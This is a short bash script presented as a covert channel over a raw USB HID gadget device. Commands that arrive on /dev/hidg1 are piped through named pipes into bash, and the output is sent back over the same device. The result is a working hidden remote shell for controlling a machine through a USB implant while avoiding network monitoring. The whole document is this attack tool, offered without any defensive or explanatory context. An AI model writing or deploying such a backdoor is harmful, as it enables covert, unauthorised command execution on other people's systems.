#!/bin/bash
# Covert channel over raw HID device

HID_DEV=/dev/hidg1
PIPE_IN=/tmp/hid_recv
PIPE_OUT=/tmp/hid_send

mkfifo $PIPE_IN $PIPE_OUT
trap "rm -f $PIPE_IN $PIPE_OUT" EXIT

echo "[+] Listening over HID covert channel..."
tail -f $PIPE_IN | bash > $PIPE_OUT &
cat $PIPE_OUT > $HID_DEV &
cat $HID_DEV > $PIPE_IN
